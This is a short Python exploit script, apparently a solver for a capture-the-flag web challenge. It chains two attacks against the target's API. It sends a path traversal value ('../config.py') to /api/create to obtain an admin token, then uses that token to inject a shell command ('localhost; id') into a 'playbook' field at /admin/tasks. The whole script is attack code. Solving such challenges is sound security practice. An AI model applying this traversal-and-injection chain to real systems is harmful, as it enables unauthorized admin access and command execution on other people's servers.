#!/usr/bin/env python3
from os import system
from pwn import remote, context, args
import requests 

context.log_level = "error"

if args.REMOTE:
    ip = args.HOST
    port = args.RPC_PORT
    CHALL_URL = f"http://{ip}:{int(port)}"
else:
    CHALL_URL = "http://localhost:1337/"


if __name__ == "__main__":
    r = requests.post(
        f"{CHALL_URL}/api/create",
        json={
            "topic": "../config.py"
            }
        )

    boccioni_token = r.json()["boccioni_token"]

    r = requests.post(
        f"{CHALL_URL}/admin/tasks",
        headers={"Authorization": f"Bearer {boccioni_token}"},
        json={
            "playbook": "localhost; id"
            }
        )
